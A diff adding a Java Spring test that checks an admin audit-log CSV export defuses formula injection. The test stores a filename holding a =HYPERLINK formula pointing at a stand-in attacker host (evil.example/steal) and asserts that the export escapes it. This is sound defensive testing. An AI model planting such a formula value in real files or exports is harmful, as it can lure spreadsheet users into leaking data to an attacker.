@@ -95,4 +95,20 @@ class AdminAuditLogControllerTest {
         assertThat(csv).contains("Käär OÜ");
         assertThat(csv).contains("leping.pdf");
     }
+
+    @Test
+    void csvExportDefusesALeadingFormulaCharacterInTheAttackerControlledFilename() throws Exception {
+        auditLogRepository.save(new AuditLogEntry(Instant.now(), AuditActionType.CONTRACT_PARSE,
+                "EE-4", "Attacker", null,
+                "=HYPERLINK(\"http://evil.example/steal\",\"x\").pdf",
+                null, true, null));
+
+        byte[] csvBytes = mockMvc.perform(get("/api/admin/audit-log/export.csv").header("Authorization", adminAuthHeader()))
+                .andExpect(status().isOk())
+                .andReturn().getResponse().getContentAsByteArray();
+
+        String csv = new String(csvBytes, StandardCharsets.UTF_8);
+        assertThat(csv).doesNotContain("\"=HYPERLINK");
+        assertThat(csv).contains("\"'=HYPERLINK");
+    }
 }
